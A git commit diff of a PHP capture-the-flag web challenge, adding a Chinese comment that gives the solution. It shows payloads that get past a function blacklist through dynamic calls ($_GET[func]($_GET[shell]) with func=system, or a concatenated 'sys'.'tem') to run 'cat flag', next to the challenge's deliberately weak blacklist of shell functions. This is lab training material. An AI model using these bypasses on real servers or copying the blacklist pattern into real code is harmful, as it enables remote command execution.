3732ee6567238ed8c00129b2dc0329364f8b8b21
Frank <frankli0324@hotmail.com>
2019-08-10 23:26:09 +0800

    Update and rename eval.php to Dynamic.php

--- web/Dynamic.php
+++ web/Dynamic.php
@@ -1,4 +1,10 @@
- <?php
+<!--
+题目看样子是过滤了基本上所有要用的函数，但是由于php太"动态"了(题目名称)，实际上可以这么搞
+cmd=$_GET[func]($_GET[shell])&func=system&shell=cat flag
+当然也可以
+$e='sys'.'tem';$e('cat flag');
+-->
+<?php
 highlight_file(__FILE__);
 error_reporting(0);
 $blacklist = ["system", "ini_set", "exec", "scandir", "shell_exec", "proc_open", "error_log", "ini_alter", "ini_set", "pfsockopen", "readfile", "echo", "file_get_contents", "readlink", "symlink", "popen", "fopen", "file", "fpassthru"];
